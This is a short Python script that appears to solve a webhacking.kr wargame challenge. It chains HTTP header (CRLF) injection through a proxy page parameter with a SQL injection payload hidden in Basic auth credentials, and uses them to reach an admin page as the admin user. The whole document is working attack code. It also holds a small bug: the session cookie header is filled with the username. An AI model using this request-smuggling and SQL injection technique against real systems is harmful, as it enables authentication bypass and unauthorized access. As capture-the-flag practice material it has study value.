import requests
import base64
URL = "http://webhacking.kr:10008/proxy.php"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
params = {'page':''}
# username = 'guest'
# password = 'guest'

username = 'bla'
password = "' or id='admin'#" # the sql injection part

encoded_auth = base64.b64encode((username+':'+password).encode()).decode()

payload = '''/admin/ HTTP/1.1\r\nCookie: PHPSESSID={}\r\nAuthorization: Basic {}\r\n'''.format(username, encoded_auth)

params['page'] = payload

response = requests.post(URL, params=params, cookies=cookies)
print(response.text)